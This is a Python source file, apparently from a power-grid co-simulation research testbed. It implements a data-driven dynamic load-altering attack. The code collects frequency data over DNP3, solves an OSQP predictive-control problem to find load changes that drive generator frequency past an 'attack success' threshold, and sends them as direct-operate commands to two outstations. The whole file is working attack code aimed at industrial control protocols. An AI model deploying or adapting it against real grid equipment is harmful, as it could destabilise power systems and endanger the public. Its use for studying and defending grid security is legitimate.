import numpy as np
import logging
import osqp
import time
import threading

from scipy.sparse import csc_matrix

from pydnp3.opendnp3 import GroupVariation

from cosim.mylogging import getLogger
from cosim.dnp3.soe_handler import SOEHandlerAdjusted
from cosim.dnp3.lfc.LFC_master import MasterStation


log = getLogger(__name__, "logs/MDLAA.log")

# System parameters
num_load_buses = 18 # number of attackable load buses
num_gen_buses = 10  # number of generator buses
Omega_r = 1.05      # Attack success threshold
Ta = 1000     # Historical data length (must be >> T_ini + N_ap)
Tini = 20     # Initialization window (past steps to match)
Nap = 40      # Prediction horizon (future steps to optimize)
Nac = 5       # Control horizon (steps to apply)
Q = 1e5 * np.eye(num_gen_buses)             # Weight for frequency deviation penalty
R = 1e1 * np.eye(num_load_buses)            # Weight for attack effort penalty
max_attack = 0.25 * np.ones(num_load_buses)    # Max x% load alteration per bus
#min_attack = 0.25 * np.ones(num_load_buses) # Min x% load alteration per bus

# --- Initialize Data Storage ---
# Historical attack vectors (inputs) and frequency measurements (outputs)
U = np.zeros([num_load_buses, Ta]) # Input matrix (attack vectors)
Y = np.zeros([num_gen_buses, Ta])  # Output matrix (frequency measurements)

# --- Step 1: Collect Persistently Exciting Initial Data ---
# Apply random attacks to build initial Hankel matrix (persistent excitation)


def build_hankel(data, L):
    cols = data.shape[1] - L + 1  # Number of columns in Hankel matrix
    H = np.zeros((L * data.shape[0], cols))
    for i in range(L):
        row_block = data[:, i:i+cols]
        H[i*data.shape[0]:(i+1)*data.shape[0], :] = row_block
    return H


class MDLAASOEHandler(SOEHandlerAdjusted):
    def __init__(self, log_file_path="logs/soehandler.log", soehandler_log_level=logging.INFO, station_ref=None, loads_coeffs=np.zeros(num_load_buses), *args, **kwargs):
        super().__init__(log_file_path, soehandler_log_level, station_ref, *args, **kwargs)
        self._num_of_loads_managed_by_master = 10
        
        self._NOMINAL_Ps = np.array([320, 329, 628, 274, 322, 158, 224, 500, 233.8, 522, 247.5, 308.6, 139, 281, 206, 283.5, 7.5, 1104]) # MW
        self._NOMINAL_FREQ = 60 # HZ
        self._curr_freqs_pu = np.zeros(num_gen_buses)
        self._loads_coeffs = loads_coeffs
        
        self._applied_attack = -1
        
        self._U = np.empty([num_load_buses, Ta])
        self._Y = np.empty([num_gen_buses, Ta])
        
        self._iter = 0 # Adjust for waiting time with no attack at the beginning
        self._current_attack = np.zeros(num_load_buses)
                
        # Initialize history buffers (replace with actual past data)
        self._attack_history = np.zeros([num_load_buses, Tini])  # Stores Tini past attacks
        self._freq_history = np.zeros([num_gen_buses, Tini])     # Stores Tini past frequencies   
    
    
    def _process_incoming_data(self, info_gv, visitor_index_and_value):
        if info_gv in [GroupVariation.Group30Var6]:
            for i in range(num_gen_buses):
                freq = visitor_index_and_value[i][1]
                self._curr_freqs_pu[i] = (freq - self._NOMINAL_FREQ) / self._NOMINAL_FREQ
            
            if self._iter <= Ta:   
                log.info(f"Iter: {self._iter}")
                # Random attack
                new_coeffs = np.random.uniform(0, 25, num_load_buses)
                for l in range(num_load_buses):
                    self._loads_coeffs[l] = new_coeffs[l]
                    
                # Normal DLAA with sensor at gen 3 and attack at load 4 and 20
                self._do_attack()
                
                # Collecting measurements
                if self._iter >= 0 and self._iter < Ta:
                    log.debug(f"Freqs: {['{0:.5f}'.format(i) for i in self._curr_freqs_pu.tolist()]}")
                    self._Y[:, self._iter] = self._curr_freqs_pu
                if self._iter > 0:
                    log.debug(f"Attack coeffs: {self._loads_coeffs.tolist()}")
                    self._U[:, self._iter-1] = self._curr_freqs_pu[2] * self._loads_coeffs * self._NOMINAL_Ps
                    log.debug(f"Loads: {['{0:.4f}'.format(i) for i in self._U[:, self._iter-1].tolist()]}")
                self._iter += 1
                
                # Initializations before the online phase
                if self._iter == Ta:
                    self._attack_history = self._U[:, :Tini].copy()
                    self._freq_history = self._Y[:, :Tini].copy()    
                    
            elif self._applied_attack == -1:
                log.info("Building Hankels etc.")
                # Update history buffers (shift left and append new data)
                self._attack_history = np.roll(self._attack_history, -1, axis=1)
                self._attack_history[:, -1] = self._current_attack
                self._freq_history = np.roll(self._freq_history, -1, axis=1)
                self._freq_history[:, -1] = self._curr_freqs_pu
                
                # Construct u_ini and y_ini from Tini past samples
                u_ini = self._attack_history.flatten(order='F')  # Column-wise flattening
                y_ini = self._freq_history.flatten(order='F')
                             
                HU = build_hankel(self._U, Tini + Nap) # Shape: [(Tini+Nap)*num_load_buses, T_data-Tini-Nap+1]
                HY = build_hankel(self._Y, Tini + Nap) # Shape: [(Tini+Nap)*num_gen_buses, T_data-Tini-Nap+1]

                # Split into past/future blocks
                Up = HU[:Tini*num_load_buses, :]
                self._Uf = HU[Tini*num_load_buses:(Tini+Nap)*num_load_buses, :]
                Yp = HY[:Tini*num_gen_buses, :]
                Yf = HY[Tini*num_gen_buses:(Tini+Nap)*num_gen_buses, :]
                
                combined_Hankel = np.vstack([Up, Yp, self._Uf, Yf])
                rank = np.linalg.matrix_rank(combined_Hankel)
                log.info(f"Rank of combined Hankel matrix: {rank} / {combined_Hankel.shape[1]} columns")
                assert rank == combined_Hankel.shape[1], "Hankel matrix is not full rank"
                
                # Check if [u_ini; y_ini] lies in the column space of [Up; Yp]
                A_eq = np.vstack([Up, Yp])
                target = np.hstack([u_ini, y_ini])

                # Solve least-squares: Find g such that A_eq * g ≈ target
                g_ls = np.linalg.lstsq(A_eq, target, rcond=None)[0]
                residual = np.linalg.norm(A_eq @ g_ls - target)
                log.info(f"Least-squares residual: {residual}")
                #assert residual <= 1e-6, "Initial conditions incompatible with historical data!"
                
                # Construct OSQP problem
                H = Yf.T @ np.kron(np.eye(Nap), Q) @ Yf + self._Uf.T @ np.kron(np.eye(Nap), R) @ self._Uf
                f = -Yf.T @ np.kron(np.eye(Nap), Q) @ np.tile(Omega_r, (Nap*num_gen_buses, 1))

                # Equality constraints: [Up; Yp] * g = [u_ini; y_ini]
                A_eq = np.vstack([Up, Yp])
                lb_eq = np.hstack([u_ini, y_ini])
                ub_eq = lb_eq.copy()
                
                # Inequality constraints: Uf * g <= max_attack (repeated for N steps)
                A_ineq = self._Uf
                ub_ineq = np.tile(max_attack, Nap)        # Upper bound - twice the nominal power
                lb_ineq = -np.inf * np.ones_like(ub_ineq) # Make sure how it works: Lower bound - half the nominal power
                
                # Combine constraints
                A = np.vstack([A_eq, A_ineq])
                lb = np.hstack([lb_eq, lb_ineq])
                ub = np.hstack([ub_eq, ub_ineq])
                
                # Solve with OSQP
                prob = osqp.OSQP()    
                prob.setup(
                    P=csc_matrix(H),
                    q=f.flatten(),
                    A=csc_matrix(A),
                    l=lb,
                    u=ub,
                    #eps_abs=1e-6,
                    #eps_rel=1e-6,
                    #max_iter=20000,
                    verbose=True
                )
                log.info("Solving OSQP")
                self._OSQP_result = prob.solve()   
                
                if self._OSQP_result.info.status != "solved":
                    log.warning(f"Optimization failed. Status: {self._OSQP_result.info.status}. Skipping...")
                    return
                self._applied_attack = 0
            
            else:
                log.info("Extracting optimal attack sequence (first Nac steps)")
                g_opt = self._OSQP_result.x
                u_opt = (self._Uf @ g_opt).reshape(Nap, num_load_buses)
                apply_attack = u_opt[:Nac, :]
                
                self._loads_coeffs = apply_attack[self._applied_attack, :]
                log.info(f"Success, coeffs: {[float(load) for load in self._loads_coeffs]}")
                self._do_attack()
                self._applied_attack = -1 if self._applied_attack == Nac else self._applied_attack + 1


    def _do_attack(self):
        loads = []
        for i in range(self._num_of_loads_managed_by_master):
            loads.append(float(self._curr_freqs_pu[2] * -self._loads_coeffs[i] * self._NOMINAL_Ps[i]))
            self.station_ref.send_direct_point_command(40, 4, i, loads[i])
        log.info(f"Doing DLAA: {loads}")
                   

# Secondary master station applying the calculated attacks to second set of loads
class MDLAAHandlerSecondary(SOEHandlerAdjusted):
    def __init__(self, log_file_path="logs/soehandler.log", soehandler_log_level=logging.INFO, station_ref=None, loads_coeffs=np.zeros(num_load_buses), *args, **kwargs):
        super().__init__(log_file_path, soehandler_log_level, station_ref, *args, **kwargs)
        self._num_of_loads_managed_by_master = 8
        self._loads_coeffs = loads_coeffs
        
        self._NOMINAL_FREQ = 60 # HZ
        self._NOMINAL_Ps = [247.5, 308.6, 139, 281, 206, 283.5, 7.5, 1104] # MW
        self._curr_freqs_pu = np.zeros(num_gen_buses)
        
        
    def _process_incoming_data(self, info_gv, visitor_ind_val):
        if info_gv in [GroupVariation.Group30Var6]:
            for i in range(num_gen_buses):
                freq = visitor_ind_val[i][1]
                self._curr_freqs_pu[i] = (freq - self._NOMINAL_FREQ) / self._NOMINAL_FREQ           
            self._do_attack()
                
    
    def _do_attack(self):
        loads = []
        for i in range(self._num_of_loads_managed_by_master):
            loads.append(float(self._curr_freqs_pu[2] 
                               * -self._loads_coeffs[num_load_buses - self._num_of_loads_managed_by_master + i]
                               * self._NOMINAL_Ps[i]))
            self.station_ref.send_direct_point_command(40, 4, i, loads[i])
        log.info(f"Doing DLAA2: {loads}")


def waiting():
    while True:
        time.sleep(1)


def main():
    logs_file = "logs/d_r_lfc_mdlaa.log"
    outstation_ip = "172.24.14.212"
    port = 20001
    outstation_ip2 = "172.24.14.213"
    port2 = 20002
    
    scan_time = 100 # ms
    loads_coeffs = np.zeros(num_load_buses)
        
    master = MasterStation(outstation_ip=outstation_ip, port=port, master_id=1, outstation_id=2)
    soe_handler = MDLAASOEHandler(logs_file, station_ref=master, loads_coeffs=loads_coeffs)
    master.configure_master(soe_handler, outstation_ip, port, scan_time=scan_time)
    
    master2 = MasterStation(outstation_ip=outstation_ip2, port=port2, master_id=1, outstation_id=2)
    soe_handler2 = MDLAAHandlerSecondary(logs_file, station_ref=master2, loads_coeffs=loads_coeffs)
    master2.configure_master(soe_handler2, outstation_ip2, port2, scan_time=scan_time)
    
    master.start()
    master2.start()
    
    waiting_thread = threading.Thread(target=waiting, daemon=True)
    waiting_thread.start()
    waiting_thread.join()
    del master
    del master2
    exit()


if __name__ == "__main__":
    main()